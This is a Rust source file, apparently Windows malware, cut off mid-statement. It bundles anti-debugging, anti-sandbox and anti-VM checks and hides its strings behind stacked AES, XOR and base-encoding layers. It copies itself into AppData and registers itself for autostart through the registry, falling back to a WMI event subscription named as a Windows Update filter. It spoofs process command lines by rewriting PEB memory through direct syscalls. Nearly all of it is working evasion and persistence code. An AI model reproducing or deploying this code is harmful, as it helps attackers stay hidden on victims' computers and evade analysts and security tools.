# ! [allow (non_snake_case)]
# ! [allow (unused_unsafe)]
mod power;
mod syscalls;
use anti_debug_rust;
use anti_sandbox;
use anti_vm;
use crate::anti_debug_rust::bad_processes;
use crate::anti_debug_rust::blacklisted_windows;
use crate::anti_debug_rust::debugger_detection;
use crate::anti_debug_rust::hooks_detection;
use crate::anti_debug_rust::parent_anti_debug;
use crate::anti_debug_rust::run_debug_checks;
use crate::anti_sandbox::admin_check;
use crate::anti_sandbox::all_tokens;
use crate::anti_sandbox::clean_environment_detection;
use crate::anti_sandbox::critical_process;
use crate::anti_sandbox::internet_check;
use crate::anti_sandbox::pc_uptime;
use crate::anti_sandbox::recent_file_activity;
use crate::anti_sandbox::repetitive_process;
use crate::anti_sandbox::run_environment_checks;
use crate::anti_sandbox::running_processes;
use crate::anti_sandbox::runtime_detector;
use crate::anti_sandbox::usb_check;
use crate::anti_sandbox::username_check;
use crate::anti_vm::anyrun_detection;
use crate::anti_vm::comodo_antivirus_detection;
use crate::anti_vm::deep_freeze_detection;
use crate::anti_vm::hyperv_check;
use crate::anti_vm::kvm_check;
use crate::anti_vm::monitor_metrics;
use crate::anti_vm::parallels_check;
use crate::anti_vm::qemu_check;
use crate::anti_vm::run_vm_checks;
use crate::anti_vm::sandboxie_detection;
use crate::anti_vm::shadow_defender_detection;
use crate::anti_vm::triage_detection;
use crate::anti_vm::virtualbox_detection;
use crate::anti_vm::vm_artifacts;
use crate::anti_vm::vm_platform_check;
use crate::anti_vm::vmware_detection;
use crate::syscalls::SYSCALLS;
use once_cell::sync::Lazy;
use power::run_all_checks;
use std::env;
use std::ffi::c_void;
use std::fs;
use std::mem::size_of;
use std::mem::transmute;
use std::mem::zeroed;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::NTSTATUS;
use windows_sys::Win32::Foundation::UNICODE_STRING;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
use windows_sys::Win32::System::Registry::HKEY_CURRENT_USER;
use windows_sys::Win32::System::Registry::KEY_WRITE;
use windows_sys::Win32::System::Registry::REG_SZ;
use windows_sys::Win32::System::Registry::RegOpenKeyExW;
use windows_sys::Win32::System::Registry::RegSetValueExW;
use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
use windows_sys::Win32::System::Threading::CreateProcessW;
use windows_sys::Win32::System::Threading::PEB;
use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
use windows_sys::Win32::System::Threading::STARTUPINFOW;

#[inline(never)]
fn checksum_i_rdqmpfqmb_jr(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_kmoddfqr_lmhb(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_i_rdqmpfqmb_jr(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

            fn kqsbqt_zd (s : & str) -> Vec < u16 > { s . encode_utf16 () . collect () } fn deyjqly_p () -> bool { println ! ("[DEBUG] Persistence basladi") ; if let Some (appdata) = env :: var_os (decode_kmoddfqr_lmhb (& [14 , 15 , 215 , 143 , 90 , 250 , 39 , 172 , 93 , 44 , 6 , 58 , 130 , 195 , 157 , 17 , 1 , 244 , 239 , 35 , 153 , 133 , 74 , 184 , 64 , 227 , 114 , 28 , 228 , 207 , 143 , 111 , 226 , 35 , 49 , 194 , 157 , 197 , 207 , 10 , 106 , 252 , 127 , 228 , 238 , 64 , 119 , 21 , 149 , 243 , 109 , 209 , 126 , 161 , 178 , 82 , 14 , 150 , 28 , 208 , 17 , 159 , 119 , 149 , 39 , 14 , 61 , 185 , 130 , 186 , 109 , 100 , 107 , 11 , 117 , 239 , 64 , 53 , 177 , 147 , 206 , 95 , 188 , 81 , 59 , 19 , 142 , 24 , 41 , 195 , 15 , 187 , 220 , 247 , 177 , 70] , & [217 , 124 , 4 , 211 , 152 , 202 , 49 , 116 , 64 , 144 , 19 , 169 , 62 , 127 , 18 , 2 , 79 , 25 , 72 , 174 , 222 , 108 , 58 , 60 , 39 , 27 , 61 , 109 , 123 , 88 , 48 , 245 , 201 , 150 , 224 , 220 , 113 , 250 , 201 , 152 , 54 , 73 , 31 , 73 , 48 , 52 , 10 , 64 , 56 , 110 , 207 , 125 , 174 , 7 , 63 , 195 , 224 , 218 , 13 , 196 , 79 , 83 , 60 , 85 , 209 , 120 , 94 , 48 , 14 , 11 , 37 , 95 , 71 , 128 , 236 , 113 , 135 , 64 , 51 , 236 , 170 , 214 , 221 , 248 , 182 , 82 , 49 , 44] , 8770323218940u64)) { let target_dir = Path :: new (& appdata) . join (decode_kmoddfqr_lmhb (& [96 , 19 , 228 , 239 , 200 , 156 , 182 , 67 , 96 , 174 , 10 , 249 , 183 , 87 , 75 , 232 , 2 , 129 , 243 , 31 , 39 , 175 , 146 , 164 , 110 , 248 , 61 , 132 , 127 , 250 , 182 , 82 , 252 , 129 , 248 , 114 , 106 , 226 , 43 , 76 , 184 , 22 , 173 , 101 , 251 , 13 , 70 , 244 , 155 , 213 , 49 , 178 , 34 , 192 , 3 , 111 , 126 , 56 , 235 , 231 , 50 , 40 , 23 , 220 , 121 , 16 , 113 , 250 , 246 , 228 , 115 , 38 , 10 , 237 , 203 , 147 , 180 , 196 , 189 , 41 , 61 , 6 , 208 , 143 , 124 , 197 , 111 , 204 , 116 , 58 , 245 , 60 , 156 , 48 , 26 , 70 , 63 , 157 , 120 , 177 , 232 , 105 , 90 , 132 , 31 , 151 , 64 , 30 , 84 , 19 , 57 , 118 , 142 , 44 , 128 , 209 , 97 , 140 , 147 , 33 , 145 , 154 , 176 , 143 , 93 , 231 , 183 , 134 , 177 , 35 , 184 , 235 , 237 , 5 , 184 , 227 , 62 , 12 , 108 , 189 , 130 , 254 , 26 , 89 , 203 , 142 , 27 , 16 , 87 , 52 , 39 , 174 , 59 , 41 , 138 , 140 , 94 , 103 , 174 , 59 , 141 , 200 , 130 , 115 , 25 , 220 , 182 , 179 , 53 , 52 , 71 , 14 , 98 , 124 , 252 , 22 , 187 , 179 , 23 , 255 , 50 , 196 , 105 , 166 , 104 , 111 , 206 , 76 , 238 , 242 , 187 , 197 , 89 , 250 , 17 , 178 , 110 , 155 , 252 , 188 , 193 , 176 , 12 , 123 , 130 , 92 , 102 , 114] , & [188 , 106 , 4 , 190 , 153 , 23 , 246 , 90 , 234 , 156 , 227 , 133 , 15 , 105 , 181 , 159 , 103 , 15 , 24 , 245 , 168 , 123 , 88 , 78 , 111 , 155 , 191 , 19 , 85 , 239 , 112 , 70 , 33 , 75 , 14 , 201 , 23 , 159 , 241 , 154 , 240 , 253 , 180 , 227 , 114 , 34 , 152 , 126 , 227 , 80 , 42 , 50 , 53 , 155 , 113 , 78 , 95 , 10 , 97 , 136 , 82 , 224 , 52 , 203 , 155 , 24 , 187 , 160 , 89 , 27 , 7 , 150 , 171 , 158 , 18 , 4 , 102 , 221 , 81 , 240 , 64 , 55 , 149 , 193 , 21 , 194 , 109 , 210] , 67886253082366u64)) ; if let Ok (current_exe) = std :: env :: current_exe () { let target_exe = target_dir . join (decode_kmoddfqr_lmhb (& [181 , 229 , 250 , 255 , 103 , 25 , 91 , 215 , 220 , 206 , 228 , 181 , 245 , 4 , 207 , 243 , 132 , 23 , 94 , 63 , 104 , 15 , 114 , 208 , 152 , 5 , 72 , 98 , 30 , 150 , 253 , 35 , 152 , 41 , 247 , 43 , 70 , 149 , 165 , 30 , 132 , 224 , 91 , 74 , 154 , 65 , 156 , 95 , 183 , 56 , 206 , 31 , 169 , 122 , 248 , 142 , 135 , 5 , 72 , 224 , 32 , 40 , 224 , 240 , 216 , 180 , 99 , 145 , 197 , 241 , 92 , 156 , 158 , 228 , 2 , 53 , 172 , 112 , 4 , 62 , 134 , 24 , 235 , 127 , 140 , 233 , 50 , 138 , 57 , 171 , 101 , 86 , 78 , 47 , 42 , 254 , 188 , 73 , 209 , 254 , 212 , 175 , 172 , 72 , 254 , 159 , 211 , 154 , 120 , 118 , 3 , 152 , 228 , 117 , 196 , 139 , 245 , 84 , 44 , 118 , 11 , 96 , 3 , 209 , 162 , 145 , 218 , 13 , 197 , 26 , 67 , 166 , 197 , 11 , 182 , 225 , 64 , 244 , 239 , 82 , 81 , 38 , 84 , 10 , 158 , 230 , 214 , 73 , 79 , 167 , 67 , 103 , 120 , 87 , 143 , 214 , 32 , 209 , 42 , 148] , & [55 , 187 , 243 , 220 , 238 , 165 , 40 , 57 , 104 , 28 , 73 , 186 , 178 , 91 , 193 , 155 , 138 , 227 , 115 , 162 , 234 , 62 , 5 , 49 , 22 , 236 , 161 , 165 , 41 , 94 , 25 , 170 , 190 , 41 , 93 , 150 , 244 , 178 , 59 , 44 , 96 , 127 , 20 , 148 , 3 , 62 , 184 , 13 , 188 , 237 , 95 , 234 , 98 , 191 , 1 , 173 , 73 , 204 , 181 , 207 , 107 , 135 , 24 , 29 , 111 , 69 , 240 , 177 , 106 , 234 , 236 , 93 , 10 , 33 , 173 , 239 , 96 , 82 , 202 , 22 , 178 , 218 , 46 , 20 , 93 , 181 , 165 , 221] , 41729902249282u64)) ; if target_exe . exists () { println ! ("[DEBUG] Dosya zaten var, persistence atlaniyor") ; return true ; } let _ = std :: fs :: create_dir_all (& target_dir) ; if std :: fs :: copy (& current_exe , & target_exe) . is_err () { return false ; } if dfdxdvxp (& target_exe) { println ! ("[DEBUG] Direct registry basarili") ; return true ; } if zeqj_id_xr (& target_exe) { println ! ("[DEBUG] WMI persistence basarili") ; return true ; } } } false } fn dfdxdvxp (target_exe : & Path) -> bool {  let key_path = decode_kmoddfqr_lmhb (& [144 , 99 , 255 , 13 , 205 , 191 , 252 , 182 , 124 , 97 , 1 , 244 , 3 , 6 , 169 , 98 , 2 , 187 , 69 , 56 , 38 , 113 , 40 , 157 , 200 , 140 , 228 , 150 , 66 , 80 , 27 , 155 , 220 , 140 , 186 , 27 , 32 , 8 , 78 , 229 , 209 , 161 , 73 , 234 , 81 , 54 , 218 , 27 , 80 , 132 , 182 , 226 , 142 , 184 , 111 , 185 , 23 , 145 , 110 , 93 , 68 , 122 , 95 , 10 , 184 , 200 , 58 , 19 , 251 , 158 , 103 , 137 , 207 , 3 , 144 , 249 , 252 , 8 , 170 , 252 , 214 , 45 , 245 , 6 , 236 , 153 , 105 , 211 , 149 , 213 , 134 , 226 , 204 , 137 , 43 , 215 , 221 , 2 , 216 , 132 , 76 , 26 , 223 , 132 , 164 , 17 , 246 , 154 , 216 , 206 , 115 , 211 , 242 , 213 , 72 , 209 , 164 , 128 , 66 , 242 , 41 , 38 , 247 , 149 , 47 , 251 , 171 , 60 , 233 , 79 , 96 , 43 , 44 , 63 , 26 , 81 , 234 , 43 , 155 , 227 , 25 , 113 , 109 , 154 , 143 , 90 , 171 , 170 , 215 , 116 , 62 , 41 , 179 , 249 , 145 , 2 , 35 , 196 , 7 , 46 , 128 , 242 , 244 , 22 , 127 , 137 , 109 , 29 , 113 , 69 , 56 , 230 , 129 , 245 , 2 , 60 , 221 , 144 , 108 , 210 , 202 , 196 , 77 , 107 , 58 , 248 , 231 , 34 , 225 , 230 , 155 , 170 , 247 , 3 , 137 , 11 , 47 , 113 , 31 , 240 , 53 , 129 , 236 , 68 , 99 , 201 , 73 , 214 , 95 , 201 , 3 , 30 , 155 , 220 , 202 , 202 , 85 , 70 , 79 , 173 , 218 , 140 , 156 , 251 , 119 , 249 , 8 , 252 , 91 , 88 , 65 , 30 , 62 , 109 , 145 , 9 , 77 , 101 , 7 , 62 , 174 , 122 , 70 , 122 , 237 , 177 , 251 , 98 , 115 , 158 , 179 , 223 , 0 , 14 , 252 , 16 , 61 , 26 , 100 , 153 , 179 , 180 , 91 , 108 , 110 , 179 , 77 , 143 , 212 , 11 , 164 , 67 , 48 , 95 , 128 , 68 , 114 , 65 , 94 , 191 , 69 , 73 , 245 , 2 , 46 , 90 , 118 , 182 , 79 , 202 , 211 , 162 , 74 , 189 , 190 , 2 , 61 , 169 , 157 , 221 , 54 , 9 , 62 , 43 , 99 , 22 , 38 , 253 , 179 , 204 , 161 , 254 , 9 , 192 , 183 , 88 , 132 , 50 , 87 , 162 , 14 , 52 , 106 , 155 , 61 , 231 , 68 , 169 , 211 , 147 , 224 , 171 , 75 , 243 , 164 , 135 , 131 , 92 , 75 , 171 , 228 , 171 , 76 , 248 , 185 , 41 , 243 , 231 , 87 , 166 , 201 , 51 , 58 , 150 , 240 , 100 , 51 , 125 , 155 , 138 , 196 , 86 , 99 , 89 , 133 , 188 , 23 , 74 , 69 , 238 , 215 , 163 , 160 , 41 , 79 , 225 , 234 , 206 , 114 , 244 , 78 , 179 , 155 , 14 , 45 , 38 , 102 , 187 , 189 , 1 , 130 , 239 , 120 , 41 , 218 , 82 , 151 , 230 , 194 , 240 , 129 , 71 , 42 , 32 , 19 , 248 , 191 , 194 , 183 , 32 , 97 , 96 , 205 , 11 , 62 , 234 , 73 , 110 , 193 , 208 , 138 , 22 , 135 , 136 , 252 , 106 , 9 , 140 , 124 , 98 , 49 , 102 , 248 , 245 , 44 , 160 , 59 , 13 , 60 , 66 , 169 , 232 , 232 , 160 , 133 , 154 , 184 , 151 , 109 , 137 , 87 , 202 , 223 , 96 , 32 , 220 , 86 , 79 , 182 , 55 , 18 , 106 , 157 , 37 , 197 , 223 , 148 , 217 , 143 , 151 , 205 , 100 , 14 , 149 , 89 , 81 , 165 , 251 , 74 , 51 , 45 , 212 , 33 , 253 , 172 , 81 , 149 , 212 , 195 , 36 , 182 , 108 , 92 , 111 , 85 , 131 , 107 , 218 , 52 , 55 , 73 , 1 , 20 , 255 , 73 , 17 , 72 , 11 , 250 , 127 , 180 , 53 , 3 , 236 , 217 , 153 , 116 , 77 , 68 , 213 , 10 , 127 , 175 , 138 , 32 , 239 , 57 , 61] , & [115 , 30 , 219 , 124 , 182 , 30 , 69 , 106 , 152 , 10 , 183 , 171 , 5 , 162 , 27 , 87 , 53 , 248 , 196 , 118 , 69 , 197 , 178 , 38 , 67 , 75 , 190 , 184 , 101 , 193 , 134 , 66 , 51 , 54 , 23 , 109 , 62 , 197 , 190 , 207 , 101 , 248 , 136 , 16 , 108 , 223 , 168 , 205 , 45 , 224 , 23 , 204 , 196 , 22 , 55 , 163 , 104 , 217 , 97 , 215 , 104 , 250 , 69 , 156 , 215 , 7 , 148 , 83 , 0 , 193 , 64 , 13 , 236 , 158 , 178 , 218 , 114 , 90 , 121 , 123 , 234 , 53 , 40 , 160 , 77 , 142 , 86 , 104] , 181041461465691u64) ; let value_name = decode_kmoddfqr_lmhb (& [104 , 88 , 140 , 222 , 67 , 106 , 138 , 78 , 165 , 15 , 178 , 81 , 121 , 229 , 127 , 192 , 152 , 155 , 27 , 77 , 131 , 223 , 142 , 66 , 54 , 46 , 144 , 152 , 36 , 62 , 68 , 79 , 78 , 38 , 81 , 253 , 174 , 70 , 239 , 90 , 233 , 22 , 25 , 30 , 222 , 201 , 29 , 60 , 35 , 107 , 247 , 57 , 215 , 194 , 102 , 131 , 93 , 45 , 63 , 73 , 216 , 13 , 6 , 170 , 232 , 173 , 150 , 203 , 27 , 189 , 128 , 241 , 149 , 158 , 195 , 178 , 64 , 126 , 217 , 26 , 67 , 185 , 213 , 173 , 29 , 194 , 16 , 240 , 134 , 43 , 108 , 126 , 240 , 134 , 79 , 67 , 45 , 249 , 98 , 20 , 221 , 198 , 146 , 33 , 160 , 225 , 0 , 149 , 116 , 53 , 131 , 192 , 143 , 23 , 30 , 96 , 109 , 254 , 20 , 31 , 143 , 215 , 42 , 56 , 65 , 100 , 220 , 119 , 207 , 18 , 146 , 142 , 101 , 11 , 120 , 148 , 24 , 134 , 162 , 2 , 136 , 107 , 171 , 67 , 39 , 25 , 66 , 113 , 199 , 158 , 56 , 45 , 64 , 219 , 217 , 63 , 162 , 118 , 108 , 147] , & [222 , 114 , 88 , 143 , 141 , 223 , 155 , 27 , 13 , 111 , 174 , 175 , 142 , 2 , 103 , 250 , 231 , 200 , 65 , 69 , 155 , 106 , 17 , 73 , 229 , 92 , 247 , 241 , 85 , 202 , 58 , 151 , 199 , 14 , 210 , 29 , 59 , 204 , 173 , 30 , 184 , 35 , 128 , 32 , 75 , 202 , 60 , 100 , 155 , 8 , 30 , 68 , 90 , 129 , 135 , 252 , 171 , 84 , 144 , 233 , 153 , 67 , 233 , 2 , 251 , 97 , 52 , 128 , 66 , 53 , 226 , 114 , 16 , 26 , 126 , 121 , 160 , 62 , 119 , 41 , 167 , 67 , 238 , 172 , 126 , 242 , 16 , 70] , 40647570490703u64) ; let value_data = target_exe . to_string_lossy () . to_string () ; let key_path_wide : Vec < u16 > = key_path . encode_utf16 () . chain (std :: iter :: once (0)) . collect () ; let value_name_wide : Vec < u16 > = value_name . encode_utf16 () . chain (std :: iter :: once (0)) . collect () ; let value_data_wide : Vec < u16 > = value_data . encode_utf16 () . chain (std :: iter :: once (0)) . collect () ; let mut hkey : isize = 0 ; let result = unsafe { RegOpenKeyExW (HKEY_CURRENT_USER , key_path_wide . as_ptr () , 0 , KEY_WRITE , & mut hkey ,) } ; if result != 0 { println ! ("[DEBUG] RegOpenKeyExW failed: {}" , result) ; return false ; } let result = unsafe { RegSetValueExW (hkey , value_name_wide . as_ptr () , 0 , REG_SZ , value_data_wide . as_ptr () as * const u8 , (value_data_wide . len () * 2) as u32 ,) } ; if result != 0 { println ! ("[DEBUG] RegSetValueExW failed: {}" , result) ; return false ; } true } fn zeqj_id_xr (target_exe : & Path) -> bool { let wmi_command = format ! ("$FilterArgs = @{{Name='WindowsUpdateFilter'; EventNameSpace='root\\\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA \\\"Win32_Process\\\" AND TargetInstance.Name=\\\"explorer.exe\\\"'}}; $Filter=Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs; $ConsumerArgs = @{{Name='WindowsUpdateConsumer'; CommandLineTemplate='{}'}}; $Consumer=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs; $BindingArgs = @{{Filter=$Filter; Consumer=$Consumer}}; $Binding=Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs" , target_exe . to_string_lossy ()) ; hyste_lk_p (& format ! ("powershell.exe -ExecutionPolicy Bypass -Command \"{}\"" , wmi_command) , decode_kmoddfqr_lmhb (& [85 , 72 , 83 , 204 , 66 , 182 , 141 , 169 , 118 , 69 , 185 , 223 , 154 , 151 , 16 , 100 , 137 , 42 , 50 , 122 , 11 , 44 , 222 , 35 , 92 , 214 , 192 , 244 , 158 , 115 , 124 , 7 , 35 , 85 , 19 , 57 , 57 , 109 , 25 , 141 , 203 , 99 , 182 , 78 , 47 , 110 , 201 , 83 , 221 , 146 , 245 , 161 , 136 , 148 , 24 , 147 , 149 , 229 , 37 , 111 , 94 , 249 , 152 , 16 , 106 , 71 , 85 , 114 , 6 , 190 , 137 , 200 , 205 , 163 , 205 , 245 , 204 , 167 , 78 , 197 , 55 , 93 , 225 , 56 , 13 , 41 , 120 , 67 , 83 , 10 , 30 , 22 , 90 , 106 , 48 , 220 , 225 , 107 , 207 , 108 , 112 , 47 , 79 , 33 , 35 , 99 , 99 , 68 , 199 , 77 , 101 , 51 , 161 , 250 , 96 , 112 , 211 , 130 , 216 , 175 , 31 , 92 , 99 , 148 , 157 , 218 , 62 , 111 , 143 , 85 , 98 , 179 , 196 , 87 , 57 , 69 , 153 , 213 , 21 , 239 , 19 , 185 , 232 , 98 , 41 , 76 , 215 , 154 , 25 , 137 , 194 , 109 , 251 , 65 , 32 , 220 , 235 , 139 , 92 , 240] , & [59 , 1 , 65 , 138 , 52 , 247 , 230 , 192 , 195 , 82 , 241 , 148 , 88 , 24 , 16 , 223 , 127 , 234 , 111 , 205 , 182 , 138 , 22 , 246 , 26 , 56 , 225 , 65 , 245 , 185 , 65 , 161 , 168 , 7 , 175 , 10 , 62 , 200 , 25 , 197 , 233 , 55 , 158 , 62 , 78 , 222 , 60 , 135 , 7 , 55 , 110 , 158 , 30 , 147 , 235 , 199 , 94 , 115 , 17 , 219 , 17 , 68 , 164 , 243 , 116 , 187 , 228 , 198 , 59 , 169 , 155 , 33 , 127 , 183 , 50 , 244 , 138 , 118 , 33 , 198 , 235 , 20 , 241 , 13 , 152 , 25 , 31 , 149] , 36326833390830u64)) } fn hyste_lk_p (real_command : & str , spoofed_name : & str) -> bool { let real_command_wide = kqsbqt_zd (real_command) ; let mut spoofed_command_wide = kqsbqt_zd (spoofed_name) ; spoofed_command_wide . resize (real_command_wide . len () , ' ' as u16) ; spoofed_command_wide . push (0) ; let mut si : STARTUPINFOW = unsafe { zeroed () } ; si . cb = size_of :: < STARTUPINFOW > () as u32 ; let mut sa : SECURITY_ATTRIBUTES = unsafe { zeroed () } ; sa . nLength = size_of :: < SECURITY_ATTRIBUTES > () as u32 ; let mut pi : PROCESS_INFORMATION = unsafe { zeroed () } ; let mut current_dir = kqsbqt_zd (decode_kmoddfqr_lmhb (& [215 , 72 , 121 , 22 , 76 , 77 , 242 , 72 , 69 , 166 , 86 , 191 , 152 , 110 , 53 , 197 , 153 , 133 , 129 , 108 , 104 , 108 , 162 , 106 , 14 , 56 , 55 , 92 , 117 , 170 , 223 , 220 , 119 , 124 , 44 , 136 , 68 , 4 , 18 , 176 , 169 , 255 , 112 , 42 , 239 , 82 , 221 , 67 , 108 , 240 , 45 , 211 , 94 , 126 , 157 , 144 , 123 , 83 , 198 , 36 , 216 , 251 , 211 , 132 , 42 , 253 , 242 , 128 , 93 , 91 , 248 , 251 , 101 , 69 , 72 , 46 , 116 , 196 , 128 , 210 , 225 , 196 , 42 , 163 , 88 , 12 , 45 , 182 , 148 , 114 , 74 , 27 , 85 , 116 , 170 , 145 , 179 , 54 , 88 , 121 , 235 , 95 , 86 , 149 , 26 , 183 , 192 , 126 , 190 , 123 , 111 , 0 , 228 , 161 , 6 , 76 , 144 , 32 , 153 , 228 , 26 , 220 , 88 , 183 , 160 , 103 , 223 , 90 , 36 , 120 , 147 , 141 , 110 , 185 , 60 , 23 , 62 , 172 , 123 , 254 , 74 , 29 , 132 , 211 , 140 , 13 , 84 , 74 , 107 , 61 , 120 , 192 , 246 , 126 , 88 , 107 , 134 , 205 , 17 , 36 , 155 , 252 , 115 , 45 , 196 , 64 , 5 , 67 , 213 , 42 , 229 , 201 , 87 , 132 , 231 , 126 , 146 , 202 , 165 , 136 , 251 , 198 , 52 , 169 , 230 , 189 , 171 , 228 , 223 , 36 , 36 , 111 , 111 , 167 , 93 , 17 , 103 , 206 , 10 , 86 , 221 , 183 , 33 , 94 , 188 , 243 , 120 , 223 , 130 , 238 , 38 , 34 , 110 , 172 , 229 , 208 , 134 , 69 , 242 , 165 , 36 , 108 , 164 , 74 , 166 , 82 , 193 , 72 , 190 , 175 , 233 , 4 , 78 , 37 , 31 , 153 , 144 , 103 , 249 , 75 , 16 , 221 , 97 , 187 , 19 , 231 , 195 , 236 , 100 , 50 , 85 , 114 , 163 , 84 , 78 , 1] , & [191 , 171 , 220 , 145 , 223 , 87 , 149 , 241 , 51 , 239 , 105 , 14 , 218 , 42 , 236 , 149 , 222 , 147 , 106 , 158 , 172 , 135 , 20 , 104 , 235 , 181 , 54 , 216 , 241 , 213 , 237 , 106 , 1 , 107 , 245 , 29 , 142 , 184 , 140 , 102 , 57 , 97 , 193 , 111 , 202 , 200 , 34 , 183 , 158 , 18 , 120 , 229 , 184 , 253 , 51 , 178 , 96 , 170 , 213 , 18 , 114 , 85 , 135 , 255 , 159 , 224 , 164 , 219 , 127 , 238 , 9 , 6 , 128 , 172 , 113 , 162 , 30 , 161 , 185 , 82 , 33 , 220 , 142 , 178 , 230 , 100 , 194 , 5] , 88978837473191u64)) ; current_dir . push (0) ; let success = unsafe { CreateProcessW (null_mut () , spoofed_command_wide . as_mut_ptr () , & sa , & sa , 0 , CREATE_SUSPENDED , null_mut () , current_dir . as_ptr () , & si , & mut pi ,) } ; if success == 0 { return false ; } let mut pbi : PROCESS_BASIC_INFORMATION = unsafe { zeroed () } ; let mut return_length : u32 = 0 ; let status : NTSTATUS = unsafe { (ksmkzbal . NtQueryInformationProcess) (pi . hProcess as * mut c_void , 0 as PROCESS_INFORMATION_CLASS , & mut pbi as * mut _ as * mut c_void , size_of :: < PROCESS_BASIC_INFORMATION > () as u32 , & mut return_length ,) } ; if status != 0 { unsafe { let _ = (ksmkzbal . NtClose) (pi . hProcess as * mut c_void) ; let _ = (ksmkzbal . NtClose) (pi . hThread as * mut c_void) ; } return false ; } let mut peb : PEB = unsafe { zeroed () } ; let mut bytes_read : usize = 0 ; let status = unsafe { (ksmkzbal . NtReadVirtualMemory) (pi . hProcess as * mut c_void , pbi . PebBaseAddress as * mut c_void , & mut peb as * mut _ as * mut c_void , size_of :: < PEB > () , & mut bytes_read ,) } ; if status != 0 { unsafe { let _ = (ksmkzbal . NtClose) (pi . hProcess as * mut c_void) ; let _ = (ksmkzbal . NtClose) (pi . hThread as * mut c_void) ; } return false ; } # [repr (C)] struct Params { _filler : [u8 ; (21 + 91)] , CommandLine : UNICODE_STRING , } let mut proc_params : Params = unsafe { zeroed () } ; let status = unsafe { (ksmkzbal . NtReadVirtualMemory) (pi . hProcess as * mut c_void , peb . ProcessParameters as * mut c_void , & mut proc_params as * mut _ as * mut c_void , size_of :: < Params > () , & mut bytes_read ,) } ; if status != 0 { unsafe { let _ = (ksmkzbal . NtClose) (pi . hProcess as * mut c_void) ; let _ = (ksmkzbal . NtClose) (pi . hThread as * mut c_void) ; } return false ; } let mut bytes_written : usize = 0 ; let status = unsafe { (ksmkzbal . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , proc_params . CommandLine . Buffer as * mut c_void , real_command_wide . as_ptr () as * mut c_void , real_command_wide . len () * 2 , & mut bytes_written ,) } ; if status != 0 { unsafe { let _ = (ksmkzbal . NtClose) (pi . hProcess as * mut c_void) ; let _ = (ksmkzbal . NtClose) (pi . hThread as * mut c_void) ; } return false ; } unsafe { let mut suspend_count : u32 = 0 ; let _ = (ksmkzbal . NtResumeThread) (pi . 